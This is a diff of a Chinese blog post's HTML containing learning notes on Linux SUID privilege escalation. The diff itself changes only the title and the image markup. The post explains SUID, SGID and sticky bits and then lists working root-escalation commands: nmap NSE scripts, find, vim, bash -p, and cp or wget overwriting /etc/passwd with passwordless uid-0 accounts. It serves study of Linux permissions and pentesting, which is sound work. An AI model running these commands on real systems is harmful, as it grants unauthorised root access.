@@ -9,7 +9,7 @@
     
     <title>
         
-            suid提权学习 |
+            Linux SUID提权学习 |
         
         p0melo
     </title>
@@ -120,7 +120,7 @@
     <div class="article-content-container">
 
         <div class="article-title">
-            <span class="title-hover-animation">suid提权学习</span>
+            <span class="title-hover-animation">Linux SUID提权学习</span>
         </div>
 
         
@@ -155,7 +155,7 @@
         
 
         <div class="article-content markdown-body">
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在p牛博客看到有关suid提权的<a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >文章<i class="fas fa-external-link-alt"></i></a>，打算对suid提权这块学习记录下，由于是首次接触suid的概念，所以文章前面定义部分记录的比较详细（啰嗦），以便后续学习。</p>
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在p牛博客看到有关suid提权的<a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >文章<i class="fas fa-external-link-alt"></i></a>，打算对linux suid提权这块学习记录下，由于是首次接触suid的概念，所以文章前面定义部分记录的比较详细（啰嗦），以便后续学习。</p>
 <h2 id="0x01-什么是SUID"><a href="#0x01-什么是SUID" class="headerlink" title="0x01 什么是SUID"></a>0x01 什么是SUID</h2><h3 id="1-1-SUID"><a href="#1-1-SUID" class="headerlink" title="1.1 SUID"></a>1.1 SUID</h3><p>SUID全称是Set owner User ID up on execution，suid是赋予二进制文件一个权限，它允许程序执行者在执行时具有该程序的拥有者(owner)的权限，对于SUID权限的文件基本有这样的限制与功能：</p>
 <ul>
 <li><strong>SUID权限仅对二进制程序有效</strong></li>
@@ -172,8 +172,7 @@
 <li>因此 tester 用户在执行 passwd 程序的过程中可以修改 /etc/shadow 文件</li>
 </ol>
 <p>普通用户直接使用<code>cat</code>查看<code>/etc/shadow</code>文件是被禁止的，这里用一张示意图来表示两者区别</p>
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174007691-528388363.png" class="" title="img">
-
+<p>![img](Linux SUID提权学习/952033-20180915174007691-528388363.png)</p>
 <p>另外需要注意的是，SUID仅可用于二进制程序上，<strong>但不能够用在shell脚本上面</strong>。这是因为shell脚本是由多个二进制执行文件进行调用执行而已，所以是否有SUID权限还是看调用的二进制执行文件，而不是shell脚本本身。当然，<strong>SUID对于目录也是无效的</strong>。</p>
 <p>在搜索学习SUID时也了解到了SGID、SBIT的定义，这里也顺带提下</p>
 <h3 id="1-2-SGID"><a href="#1-2-SGID" class="headerlink" title="1.2 SGID"></a>1.2 SGID</h3><p>与SUID不同的是，SGID可以针对文件或目录来设置。如果是对文件来说，SGID有如下的功能：</p>
@@ -186,14 +185,11 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 24 Nov 17  2020 /usr/bin/locate -&gt; /etc/alternatives/locate</span><br><span class="line">lrwxrwxrwx 1 root root 16 Nov 17  2020 /etc/alternatives/locate -&gt; /usr/bin/mlocate</span><br><span class="line"><span class="meta">#</span><span class="bash"> locate是软链接指向mlocate，所以修改软连接locate的sgid权限也就是修改mlocate</span></span><br><span class="line">-rwxr-sr-x 1 root mlocate 39608 Nov 15  2018 /usr/bin/mlocate</span><br><span class="line">-rw-r----- 1 root mlocate 1292585 Jun 26 14:25 /var/lib/mlocate/mlocate.db</span><br></pre></td></tr></table></figure>
 
 <p>如果我使用普通用户tester执行locate时，tester将会取得mlocate组的支持，因此就可以去读取mlocate.db的内容了。执行过程示意图如下</p>
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174309311-990901650.png" class="" title="img">
-
+<p>![img](Linux SUID提权学习/952033-20180915174309311-990901650.png)</p>
 <p>另外，SGID对目录也支持，当用户对某一目录有写和执行权限时，该用户就可以在该目录下建立文件，如果该目录用 SGID 修饰，则该用户在这个目录下建立的文件都是属于这个目录所属的组。如下图示例，sgidtest目录属于root组，且赋予了SGID权限，poom用户在该目录下创建文件将为root属组。</p>
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231049994.png" class="" title="image-20210626231049994">
-
+<p>![image-20210626231049994](Linux SUID提权学习/image-20210626231049994.png)</p>
 <h3 id="1-3-SBIT"><a href="#1-3-SBIT" class="headerlink" title="1.3 SBIT"></a>1.3 SBIT</h3><p>其实 SBIT 与 SUID 和 SGID 的关系并不大。SBIT 是 the restricted deletion flag or sticky bit 的简称。SBIT 目前只对目录有效，用来阻止非文件的所有者删除文件。比较常见的例子就是 /tmp 目录：</p>
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231156650.png" class="" title="image-20210626231156650">
-
+<p>![image-20210626231156650](Linux SUID提权学习/image-20210626231156650.png)</p>
 <p>权限信息中最后一位 t 表明该目录被设置了 SBIT 权限。SBIT 对目录的作用是：当用户在该目录下创建新文件或目录时，仅有自己和 root 才有权力删除。</p>
 <h3 id="1-4-如何设置SUID、SGID、SBIT权限"><a href="#1-4-如何设置SUID、SGID、SBIT权限" class="headerlink" title="1.4 如何设置SUID、SGID、SBIT权限"></a>1.4 如何设置SUID、SGID、SBIT权限</h3><p>SUID、SGID、SBIT权限对应的数字为<code>SUID-&gt;4，SGID-&gt;2，SBIT-&gt;1</code></p>
 <p>通过数字法设置</p>
@@ -224,37 +220,30 @@
 <h4 id="3-1-2-nmap高版本"><a href="#3-1-2-nmap高版本" class="headerlink" title="3.1.2 nmap高版本"></a>3.1.2 nmap高版本</h4><p>namp在高版本取消了交互模式，可编写nmap的nse脚本，修改<code>/etc/passwd</code>来新增一个用户root2来达到提权的目的。</p>
 <figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> file = <span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">file:<span class="built_in">write</span>(<span class="string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)</span><br><span class="line">file:<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626174624539.png" class="" title="image-20210626174624539">
-
+<p>![image-20210626174624539](Linux SUID提权学习/image-20210626174624539.png)</p>
 <p>若namp可直接sudo执行，则可直接使用nse脚本调用<code>os.execute</code>执行命令</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</span><br></pre></td></tr></table></figure>
 
 <h3 id="3-2-find"><a href="#3-2-find" class="headerlink" title="3.2 find"></a>3.2 find</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627125229567.png" class="" title="image-20210627125229567">
-
+<p>![image-20210627125229567](Linux SUID提权学习/image-20210627125229567.png)</p>
 <h3 id="3-3-vi-vim"><a href="#3-3-vi-vim" class="headerlink" title="3.3 vi/vim"></a>3.3 vi/vim</h3><p>进入vim模式执行以下命令</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134106867.png" class="" title="image-20210627134106867">
-
+<p>![image-20210627134106867](Linux SUID提权学习/image-20210627134106867.png)</p>
 <p>若有sudo权限则可执行<code>sudo vim -c &#39;!sh&#39;</code>直接提权</p>
 <h3 id="3-4-bash"><a href="#3-4-bash" class="headerlink" title="3.4 bash"></a>3.4 bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134208588.png" class="" title="image-20210627134208588">
-
+<p>![image-20210627134208588](Linux SUID提权学习/image-20210627134208588.png)</p>
 <h3 id="3-5-cp"><a href="#3-5-cp" class="headerlink" title="3.5 cp"></a>3.5 cp</h3><p>跟高版本nmap提权方法类似，覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/passwd &gt;passwd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;root3::0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp passwd /etc/passwd</span>  </span><br><span class="line"><span class="meta">$</span><span class="bash"> su root3</span> </span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627142406117.png" class="" title="image-20210627142406117">
-
+<p>![image-20210627142406117](Linux SUID提权学习/image-20210627142406117.png)</p>
 <h3 id="3-6-mv"><a href="#3-6-mv" class="headerlink" title="3.6 mv"></a>3.6 mv</h3><p>同cp命令的步骤，覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p>
 <h3 id="3-7-nano"><a href="#3-7-nano" class="headerlink" title="3.7 nano"></a>3.7 nano</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano filename</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627143244017.png" class="" title="image-20210627143244017">
-
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627143211352.png" class="" title="image-20210627143211352">
-
+<p>![image-20210627143244017](Linux SUID提权学习/image-20210627143244017.png)</p>
+<p>![image-20210627143211352](Linux SUID提权学习/image-20210627143211352.png)</p>
 <h3 id="3-8-wget"><a href="#3-8-wget" class="headerlink" title="3.8 wget"></a>3.8 wget</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.88.88/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>
 
 <h3 id="3-9-其他测试未提权成功的命令"><a href="#3-9-其他测试未提权成功的命令" class="headerlink" title="3.9 其他测试未提权成功的命令"></a>3.9 其他测试未提权成功的命令</h3><p>网上见到有师傅整理的suid提权命令也包括下面几种，但我在Ubuntu 18和kali 2020中测试并不能提权成功，返回的只是当前用户的shell，这里先记录下</p>
@@ -280,8 +269,7 @@
 <p>这就是为什么<code>ping</code>命令未设置suid权限，却仍然可以以普通用户身份运行的原因，同样我们也可以给nmap命令增加类似的capabilities，普通用户就可以执行TCP SYN扫描啦</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap</span><br><span class="line">nmap --privileged -sU 127.0.0.1</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627151220669.png" class="" title="image-20210627151220669">
-
+<p>![image-20210627151220669](Linux SUID提权学习/image-20210627151220669.png)</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >谈一谈Linux与suid提权<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9651622.html" >Linux 特殊权限 SUID,SGID,SBIT<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://jlkl.github.io/2020/01/27/Web_15/" >Linux SUID 提权<i class="fas fa-external-link-alt"></i></a></p>
